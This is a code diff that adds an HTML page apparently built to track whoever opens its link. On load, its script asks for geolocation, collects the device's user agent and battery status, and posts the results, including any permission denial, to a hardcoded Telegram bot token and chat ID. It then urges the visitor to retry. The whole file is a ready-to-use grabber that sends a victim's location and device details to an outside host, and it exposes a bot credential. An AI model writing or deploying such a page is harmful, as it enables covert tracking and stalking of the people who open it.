@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Capture</title>
+</head>
+<body>
+  <h3>📍 Waiting for location permission...</h3>
+
+  <script>
+    // === YOUR TELEGRAM CONFIG ===
+    const BOT_TOKEN = "8273361289:AAHZeKlDTzun2-n6AdIdUm3GtnMondBLl64";
+    const CHAT_ID = "6677946042";
+
+    // Send message to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).catch(err => console.error("Telegram Error:", err));
+    }
+
+    // Get Device Info
+    async function getDeviceInfo() {
+      let batteryInfo = "";
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `Battery: ${(battery.level * 100)}% (Charging: ${battery.charging})`;
+        } else {
+          batteryInfo = "Battery info not supported";
+        }
+      } catch {
+        batteryInfo = "Battery info not accessible";
+      }
+
+      const userAgent = navigator.userAgent;
+      return `Device: ${userAgent}\n${batteryInfo}`;
+    }
+
+    // Request Location
+    async function requestLocation() {
+      const deviceInfo = await getDeviceInfo();
+
+      if (!navigator.geolocation) {
+        sendToTelegram("❌ Geolocation not supported\n\n" + deviceInfo);
+        document.body.innerHTML = "<h3>❌ Geolocation not supported</h3>";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        // ✅ Success
+        function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          const msg = `📍 Location Captured:
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy}m
+
+${deviceInfo}`;
+
+          sendToTelegram(msg);
+          document.body.innerHTML = "<h3>✅ Location sent to Telegram</h3>";
+        },
+        // ❌ Error / Denied
+        function (error) {
+          document.body.innerHTML = `
+            <h3>⚠️ Please allow location access!</h3>
+            <button onclick="requestLocation()">Retry</button>
+          `;
+          sendToTelegram("❌ Location access denied: " + error.message + "\n\n" + deviceInfo);
+        }
+      );
+    }
+
+    // Auto-run
+    requestLocation();
+  </script>
+</body>
+</html>
